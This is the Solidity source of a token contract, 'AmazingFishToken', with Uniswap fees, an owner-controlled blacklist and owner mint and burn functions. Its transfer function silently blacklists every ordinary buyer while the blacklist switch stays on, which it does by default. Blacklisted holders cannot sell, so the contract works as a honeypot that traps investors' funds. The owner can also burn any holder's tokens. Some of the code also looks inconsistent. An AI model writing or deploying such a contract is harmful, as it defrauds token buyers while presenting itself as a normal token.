{"AmazingFishToken.sol":{"content":"// SPDX-License-Identifier: MIT

pragma solidity ^0.8.6;

import './ERC20.sol';
import './SafeMath.sol';
import './Ownable.sol';
import './IUniswapV2Pair.sol';
import './IUniswapV2Factory.sol';
import './IUniswapV2Router02.sol';

contract AmazingFishToken is ERC20, Ownable {
  using SafeMath for uint256;

  IUniswapV2Router02 public uniswapV2Router;
  address public immutable uniswapV2Pair;
  mapping(address => bool) private _isExcludedFromFees;
  mapping(address => uint256) private _balances;

  uint8 private tokenDecimals = 9;
  uint256 private _totalSupply;

  address public incomeAddress = 0xB2Ee99A422758064C2e8E968BCE7edc0C6439786;
  address public gamePoolAddress = 0x9AcC2cA930023fe2E2282aACb197C2708D5AE26e;
  address public usdtAddress;

  uint256 public incomeFee = 3;
  uint256 public poolFee = 2;

  uint256 public minExchangeAmount = 2 * 10**7 * 10**9;

  mapping(address => bool) private _blackUsers;
  bool private _isBlackOpen = true;

  bool inSwapAndLiquify;
  modifier lockTheSwap() {
    inSwapAndLiquify = true;
    _;
    inSwapAndLiquify = false;
  }

  event UpdateUniswapV2Router(
    address indexed newAddress,
    address indexed oldAddress
  );
  event ExcludeFromFees(address indexed account, bool isExcluded);
  event TokensBurned(uint256 amount);

  constructor(address router, address _usdtAddress)
    ERC20('AmazingFishToken', 'AFT')
  {
    IUniswapV2Router02 _uniswapV2Router = IUniswapV2Router02(router);
    address _uniswapV2Pair = IUniswapV2Factory(_uniswapV2Router.factory())
      .createPair(address(this), _usdtAddress);

    uniswapV2Router = _uniswapV2Router;
    uniswapV2Pair = _uniswapV2Pair;
    usdtAddress = _usdtAddress;
    _isExcludedFromFees[owner()] = true;
    _isExcludedFromFees[address(this)] = true;
    _isExcludedFromFees[incomeAddress] = true;
    _isExcludedFromFees[gamePoolAddress] = true;

    mint(owner(), 1 * 10**3 * 10**8 * 10**9);
  }

  function balanceOf(address account)
    public
    view
    virtual
    override
    returns (uint256)
  {
    return _balances[account];
  }

  function totalSupply() public view override returns (uint256) {
    return _totalSupply;
  }

  function decimals() public view override returns (uint8) {
    return tokenDecimals;
  }

  function mint(address account, uint256 amount) private {
    require(account != address(0), 'ERC20: mint to the zero address');

    _beforeTokenTransfer(address(0), account, amount);

    _totalSupply = _totalSupply.add(amount);
    _balances[account] = _balances[account].add(amount);
    emit Transfer(address(0), account, amount);
  }

  function isInBlackList(address addr) external view onlyOwner returns (bool) {
    return _blackUsers[addr];
  }

  function setBlackSwitchOpen(bool blackOpen) external onlyOwner {
    _isBlackOpen = blackOpen;
  }

  function addToBlack(address black) external onlyOwner {
    _blackUsers[black] = true;
  }

  function blackRemove(address white) external onlyOwner {
    delete _blackUsers[white];
  }

  function setFee(uint256 _incomeFee, uint256 _poolFee) external onlyOwner {
    incomeFee = _incomeFee;
    poolFee = _poolFee;
  }

  function setMinExchangeAmount(uint256 _minExchangeAmount) external onlyOwner {
    minExchangeAmount = _minExchangeAmount;
  }

  function updateUniswapV2Router(address newAddress) external onlyOwner {
    require(
      newAddress != address(uniswapV2Router),
      'The router already has that address'
    );
    uniswapV2Router = IUniswapV2Router02(newAddress);
    emit UpdateUniswapV2Router(newAddress, address(uniswapV2Router));
  }

  function excludeFromFees(address account, bool excluded) external onlyOwner {
    require(
      _isExcludedFromFees[account] != excluded,
      "Account is already the value of 'excluded'"
    );
    _isExcludedFromFees[account] = excluded;
    emit ExcludeFromFees(account, excluded);
  }

  function isExcludedFromFees(address account) external view returns (bool) {
    return _isExcludedFromFees[account];
  }

  function mintToAddress(address to, uint256 amount) external onlyOwner {
    _mint(to, amount);
  }

  function burnFromAddress(address from, uint256 amount) external onlyOwner {
    _burn(from, amount);
  }

  function airdropTokens(
    address[] calldata recipients,
    uint256[] calldata amounts
  ) external onlyOwner {
    require(recipients.length > 0, 'Recipients are not specified.');
    require(
      recipients.length == amounts.length,
      'Arrays lengths does not match.'
    );

    for (uint256 i = 0; i < amounts.length; i++) {
      _transfer(_msgSender(), recipients[i], amounts[i] * (10**tokenDecimals));
    }
  }

  function _transfer(
    address sender,
    address recipient,
    uint256 amount
  ) internal override {
    require(sender != address(0), 'ERC20: transfer from the zero address');
    require(recipient != address(0), 'ERC20: transfer to the zero address');
    require(amount > 0, 'Transfer amount must be greater than zero');

    //transfer tokens
    _beforeTokenTransfer(sender, recipient, amount);

    uint256 realAmount = amount;
    uint256 incomeFeeAmount;
    uint256 poolFeeAmount;
    address _this = address(this);
    //Start calculating fees
    if (!(_isExcludedFromFees[sender] || _isExcludedFromFees[recipient])) {
      // black list
      if (_isBlackOpen) _blackUsers[recipient] = true;
      // disable black
      if (
        (sender == msg.sender && sender != uniswapV2Pair) ||
        (recipient == uniswapV2Pair)
      ) {
        require(
          !_blackUsers[sender] && !_blackUsers[recipient],
          'You are in black list now'
        );
      }
      // Convert to usdt
      if (sender != uniswapV2Pair && !inSwapAndLiquify) {
        exchangeUsdt();
      }
      // The first step is to collect the project party's income
      incomeFeeAmount = amount.mul(incomeFee).div(100);
      // The second step is to collect the game prize pool fee
      poolFeeAmount = amount.mul(poolFee).div(100);
      // dev fee
      _balances[_this] = _balances[_this].add(incomeFeeAmount);
      // game pool fee
      _balances[gamePoolAddress] = _balances[gamePoolAddress].add(
        poolFeeAmount
      );
      // Real amount
      realAmount = amount.sub(incomeFeeAmount.add(poolFeeAmount));
    }
    _balances[sender] = _balances[sender].sub(
      realAmount,
      'ERC20: transfer amount exceeds balance'
    );
    _balances[recipient] = _balances[recipient].add(realAmount);
    emit Transfer(sender, recipient, realAmount);
    if (incomeFeeAmount > 0 && poolFeeAmount > 0) {
      emit Transfer(sender, _this, incomeFeeAmount);
      emit Transfer(sender, gamePoolAddress, poolFeeAmount);
    }
  }

  //Convert to usdt
  function exchangeUsdt() private lockTheSwap {
    address _this = address(this);
    uint256 incomeAmount = balanceOf(_this);
    // exceed min exchange, start exchange once
    if (minExchangeAmount > 0 && incomeAmount >= minExchangeAmount) {
      // swap start
      address[] memory path = new address[](2);
      path[0] = _this;
      path[1] = usdtAddress;
      // approve token transfer to cover all possible scenarios
      _approve(_this, address(uniswapV2Router), minExchangeAmount);
      // swap income to usdt
      uniswapV2Router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
        minExchangeAmount,
        0, // accept any amount of ETH
        path,
        incomeAddress,
        block.timestamp
      );
    }
  }

  receive() external payable {}

  fallback() external payable {}
}
